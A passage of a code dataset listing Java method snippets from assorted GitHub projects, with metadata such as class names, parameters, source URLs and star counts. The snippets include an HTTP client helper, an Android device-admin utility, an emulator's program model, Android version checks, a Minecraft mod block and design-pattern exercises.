writer.flush();\n                    writer.close();\n                }\n                try {\n                    BufferedReader reader =\n                            new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                    String line;\n                    StringBuilder sb = new StringBuilder();\n                    while (null != (line = reader.readLine())) {\n                        sb.append(line);\n                        sb.append(\"\\r\\n\");\n                    }\n                    reader.close();\n                    this.response = sb.toString();\n                } catch (Exception e) {\n                    // it's OK, we have a response code\n                }\n                responseCode = connection.getResponseCode();\n            } finally {\n                connection.disconnect();\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30175, "method_name": "setPayload", "class_name": "HttpURLConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(String payload) {\n            this.payload = payload.getBytes();\n            connection.setDoOutput(true);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30176, "method_name": "setPayload", "class_name": "HttpURLConnectionClient", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(byte[] payload) {\n            this.payload = payload;\n            connection.setDoOutput(true);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30177, "method_name": "setHeader", "class_name": "HttpURLConnectionClient", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setHeader(String name, String value) {\n            connection.setRequestProperty(name, value);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30178, "method_name": "getResponseHeader", "class_name": "HttpURLConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseHeader(String name) {\n            return connection.getHeaderField(name);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30179, "method_name": "setMethod", "class_name": "CustomConnectionClient", "params": ["Method"], "throws": ["ProtocolException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void setMethod(Method method) throws ProtocolException {\n            this.method = method;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30180, "method_name": "getResponseCode", "class_name": "CustomConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "int", "snippet": "        public int getResponseCode() throws IOException {\n            return code;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30181, "method_name": "getResponseString", "class_name": "CustomConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseString() throws IOException {\n            return response;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30182, "method_name": "execute", "class_name": "CustomConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void execute() throws IOException {\n            int port = uri.getPort() > 0 ? uri.getPort() : 80;\n            Socket socket = new Socket(uri.getHost(), port);\n            PrintWriter writer =\n                    new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);\n            BufferedReader reader =\n                    new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // send request\n            writer.print(method.name());\n            writer.print(\" \");\n            writer.print(uri.getPath());\n            writer.print(uri.getQuery().isEmpty() ? \"\" : \"?\" + uri.getQuery());\n            writer.print(\" HTTP/1.1\\r\\n\");\n\n            writer.print(\"Host:\");\n            writer.print(uri.getHost());\n            writer.print(\":\");\n            writer.print(port);\n            writer.print(\"\\r\\n\");\n\n            for (Map.Entry<String, String> pair : headers.entrySet()) {\n                writer.print(pair.getKey());\n                writer.print(\":\");\n                writer.print(pair.getValue());\n                writer.print(\"\\r\\n\");\n            }\n            writer.print(\"\\r\\n\");\n\n            if (payload != null) {\n                writer.print(payload);\n            }\n            writer.flush();\n\n            // receive response\n            StringBuilder sb = new StringBuilder();\n            String line;\n            line = reader.readLine();\n            if (line != null) {\n                String[] tokens = line.split(\" \");\n                if (tokens.length > 2) {\n                    code = Integer.parseInt(tokens[1]);\n                }\n            }\n\n            while (null != (line = reader.readLine())) {\n                if (line.isEmpty()) {\n                    break;\n                }\n                String[] pair = line.split(\":\", 2);\n                if (pair != null && pair.length == 2) {\n                    responseHeaders.put(pair[0].trim(), pair[1].trim());\n                }\n            }\n\n            while (null != (line = reader.readLine())) {\n                sb.append(line);\n                sb.append(\"\\r\\n\");\n            }\n            response = sb.toString();\n            socket.close();\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30183, "method_name": "setPayload", "class_name": "CustomConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(String payload) {\n            this.payload = payload;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30184, "method_name": "setPayload", "class_name": "CustomConnectionClient", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(byte[] payload) {\n            throw new UnsupportedOperationException();\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30185, "method_name": "setHeader", "class_name": "CustomConnectionClient", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setHeader(String name, String value) {\n            if (name != null && value != null) {\n                this.headers.put(name.trim(), value.trim());\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30186, "method_name": "getResponseHeader", "class_name": "CustomConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseHeader(String name) {\n            return responseHeaders.get(name);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30187, "method_name": "applicationPathShouldNotAffectActuators", "class_name": "JerseyApplicationPathAndManagementPortTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid applicationPathShouldNotAffectActuators() {\n\t\tResponseEntity<String> entity = this.testRestTemplate\n\t\t\t\t.getForEntity(\"http://localhost:\" + this.managementPort + \"/actuator/health\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(entity.getBody()).contains(\"\\\"status\\\":\\\"UP\\\"\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-jersey/src/test/java/smoketest/jersey/JerseyApplicationPathAndManagementPortTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30188, "method_name": "getMemorySystem", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MemorySystem", "snippet": "    public MemorySystem getMemorySystem() {\n        return ms;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30189, "method_name": "setName", "class_name": "Program", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = Objects.toString(name, \"\");\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30190, "method_name": "getName", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30191, "method_name": "setBasicArea", "class_name": "Program", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBasicArea(boolean value) {\n        this.basicArea = value;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30192, "method_name": "hasBasicArea", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasBasicArea() {\n        return basicArea;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30193, "method_name": "addAddressRegion", "class_name": "Program", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addAddressRegion(int start, int end) {\n        regions.add(new AddressRegion(start, end));\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30194, "method_name": "addAddressRegion", "class_name": "Program", "params": ["int", "int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addAddressRegion(int start, int end, String comment) {\n        regions.add(new AddressRegion(start, end, comment));\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30195, "method_name": "addAddressRegion", "class_name": "Program", "params": ["AddressRegion"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addAddressRegion(AddressRegion a) {\n        regions.add(a);\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30196, "method_name": "setComment", "class_name": "Program", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setComment(String comment) {\n        this.comment = Objects.toString(comment, \"\");\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30197, "method_name": "getComment", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getComment() {\n        return comment;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30198, "method_name": "getAllAddressRegions", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<AddressRegion>", "snippet": "    public ArrayList<AddressRegion> getAllAddressRegions() {\n        return regions;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30199, "method_name": "getFile", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "    public File getFile() {\n        return file;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30200, "method_name": "setFile", "class_name": "Program", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFile(File file) {\n        this.file = file;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30201, "method_name": "toString", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        StringBuilder sb = new StringBuilder();\n        sb.append(getName());\n        sb.append(\"(\");\n        sb.append(getComment());\n        sb.append(\") \");\n        sb.append(\"hasBasic=\");\n        sb.append(basicArea);\n        sb.append(\", file=\");\n        sb.append(file.getAbsolutePath());\n        sb.append(\", \");\n        sb.append(regions.toString());\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/Program.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30202, "method_name": "activateDeviceAdmin", "class_name": "devicemanager", "params": ["Activity", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void activateDeviceAdmin(Activity activity, int resultCode){\n\t\tSystem.out.println(\"on activateDeviceAdmin\");\n\t\ttry {\n\t\t\tComponentName comp = new ComponentName(activity, adminreciever.class);\n\t\t\tIntent intent=new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);\n\t\t\tintent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);\n\t\t\tintent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, Html.fromHtml(activity.getResources().getString(R.string.device_admin_manager_message)));\n\t\t\tintent.setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);\n\t\t\tactivity.startActivityForResult(intent, resultCode);\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/uninstallapp/src/com/example/uninstallapp/devicemanager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30203, "method_name": "deactivateDeviceAdmin", "class_name": "devicemanager", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void deactivateDeviceAdmin(Context context){\n\t\ttry {\n\t\t\tComponentName comp = new ComponentName(context, adminreciever.class);\n\t\t\tDevicePolicyManager devicePolicyManager=(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);\n\t\t\tdevicePolicyManager.removeActiveAdmin(comp);\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/uninstallapp/src/com/example/uninstallapp/devicemanager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30204, "method_name": "isDeviceAdminActive", "class_name": "devicemanager", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isDeviceAdminActive(Context context){\n\t\tboolean flag=false;\n\t\t\n\t\ttry {\n\t\t\tDevicePolicyManager devicePolicyManager=(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);\n\t\t\tadminreciever adminReciver=new adminreciever();\n\t\t\tflag=devicePolicyManager.isAdminActive(adminReciver.getWho(context));\n\t\t\tisActive=flag;\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t\treturn flag;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/uninstallapp/src/com/example/uninstallapp/devicemanager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30205, "method_name": "move", "class_name": "Cat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void move() {\n\t\tSystem.out.println(\"\u732b\u5728\u8d70\u732b\u6b65\uff01\"); \n\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/duotai/Cat.java", "stars": "2", "class_props": {"extends": "Animal", "implements": null, "modifiers": ["public"]}}, {"id": 30206, "method_name": "catchMouse", "class_name": "Cat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void catchMouse() {\n\t\tSystem.out.println(\"\u732b\u6293\u8001\u9f20\uff01\");\n\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/duotai/Cat.java", "stars": "2", "class_props": {"extends": "Animal", "implements": null, "modifiers": ["public"]}}, {"id": 30207, "method_name": "initialize", "class_name": "AppInitTaskSDKB", "params": ["Context", "StarDriverResult"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(Context context, StarDriverResult result) {\n        try {\n            Thread.sleep(166);\n        } catch (InterruptedException e) {\n            result.success = false;\n            result.errorMessage = e.toString();\n            return;\n        }\n        result.success = true;\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/app/src/main/java/org/succlz123/stardriver/app/task/AppInitTaskSDKB.java", "stars": "4", "class_props": {"extends": "IStarDriver", "implements": null, "modifiers": ["public"]}}, {"id": 30208, "method_name": "isMarshmallow", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isMarshmallow() {\n        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.M;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30209, "method_name": "isLollipop", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isLollipop() {\n        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30210, "method_name": "isJellyBean", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isJellyBean() {\n        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30211, "method_name": "isAndroidTV", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isAndroidTV() {\n        UiModeManager uiModeManager = (UiModeManager) ButterApplication.getAppContext().getSystemService(Context.UI_MODE_SERVICE);\n        return uiModeManager.getCurrentModeType() == Configuration.UI_MODE_TYPE_TELEVISION;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30212, "method_name": "isUsingCorrectBuild", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isUsingCorrectBuild() {\n        String abi;\n        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {\n            abi = Build.CPU_ABI.toLowerCase(Locale.US);\n        } else {\n            abi = Build.SUPPORTED_ABIS[0].toLowerCase(Locale.US);\n        }\n        return BuildConfig.GIT_BRANCH.equalsIgnoreCase(\"local\") ||\n                abi.contains(getBuildAbi());\n\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30213, "method_name": "getBuildAbi", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getBuildAbi() {\n        PackageManager manager = ButterApplication.getAppContext().getPackageManager();\n        try {\n            PackageInfo info = manager.getPackageInfo(ButterApplication.getAppContext().getPackageName(), 0);\n            Integer versionCode = info.versionCode;\n\n            if(info.versionName.contains(\"local\")) {\n                return \"local\";\n            }\n\n            if(versionCode > 50000000) {\n                return \"x86\";\n            } else if(versionCode > 30000000) {\n                return \"arm\";\n            }\n        } catch (PackageManager.NameNotFoundException e) {\n            Timber.e(e, \"Couldn't get the build ABI\");\n        }\n\n        return \"unknown\";\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30214, "method_name": "descripcion", "class_name": "ViajeTodoIncluido", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String descripcion() {\n        return \"Disfruta tu viaje todo incluido\";\n    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/ViajeTodoIncluido.java", "stars": "1", "class_props": {"extends": "Viaje", "implements": null, "modifiers": ["public"]}}, {"id": 30215, "method_name": "onDraw", "class_name": "Practice02StaticLayoutView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        // \u4f7f\u7528 StaticLayout \u4ee3\u66ff Canvas.drawText() \u6765\u7ed8\u5236\u6587\u5b57\uff0c\n        // \u4ee5\u7ed8\u5236\u51fa\u5e26\u6709\u6362\u884c\u7684\u6587\u5b57\n        canvas.save();\n        canvas.translate(50, 100);\n        staticLayout1.draw(canvas);\n        canvas.translate(0, 300);\n        staticLayout2.draw(canvas);\n        canvas.restore();\n\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson3/Practice02StaticLayoutView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 30216, "method_name": "getSectionId", "class_name": "Section", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getSectionId() {\n    return sectionId;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30217, "method_name": "setSectionId", "class_name": "Section", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSectionId(Integer sectionId) {\n    this.sectionId = sectionId;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30218, "method_name": "getName", "class_name": "Section", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30219, "method_name": "setName", "class_name": "Section", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setName(String name) {\n    this.name = name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30220, "method_name": "dispose", "class_name": "SecurityMachineComposer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispose() {\n\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/security/SecurityMachineComposer.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"id": 30221, "method_name": "getMessageArray", "class_name": "SecurityMachineComposer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object[] getMessageArray() {\n        return this.data.toArray();\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/security/SecurityMachineComposer.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"id": 30222, "method_name": "initElements", "class_name": "SettSlabBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SettSlabBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30223, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SettSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30224, "method_name": "buildCPU", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildCPU(String CPU) {\n        computer.setCPU(CPU);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30225, "method_name": "buildMotherboard", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildMotherboard(String motherboard) {\n        computer.setMotherboard(motherboard);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30226, "method_name": "buildRAM", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildRAM(String RAM) {\n        computer.setRAM(RAM);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30227, "method_name": "buildGPU", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildGPU(String GPU) {\n        computer.setGPU(GPU);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30228, "method_name": "buildMonitor", "class_name": "ComputerActualBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildMonitor(String monitor) {\n        computer.setMonitor(monitor);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30229, "method_name": "AssembleComputer", 